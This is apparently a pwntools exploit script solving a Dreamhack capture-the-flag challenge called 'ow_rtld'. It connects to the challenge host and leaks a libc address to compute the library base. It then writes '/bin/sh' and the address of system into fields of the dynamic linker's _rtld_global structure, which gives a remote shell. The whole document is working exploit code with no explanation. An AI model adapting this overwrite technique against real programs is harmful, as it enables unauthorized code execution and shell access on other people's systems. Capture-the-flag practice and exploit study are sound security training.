from pwn import *
p = remote('host3.dreamhack.games', 13393)
#p = process('./ow_rtld')
e = ELF('./ow_rtld')

stdout_offset = 0x3ec760
system_offset = 0x4f550
ld_offset = 0x3f1000
rtld_global_offset = 0x22a060

p.recvuntil(b'stdout: ')
stdout_addr = int(p.recvline()[:-1],16)
libc_base = stdout_addr - stdout_offset
system = libc_base + system_offset
rtld = libc_base + ld_offset + rtld_global_offset

p.sendline(str(1))
p.sendlineafter(b'addr: ',str(rtld+2312))
p.sendlineafter(b'data: ',str(u64('/bin/sh\x00')))

p.sendline(str(1))
p.sendlineafter(b'addr: ',str(rtld+3840))
p.sendlineafter(b'data: ',str(system))

p.sendline(str(2))

p.interactive()
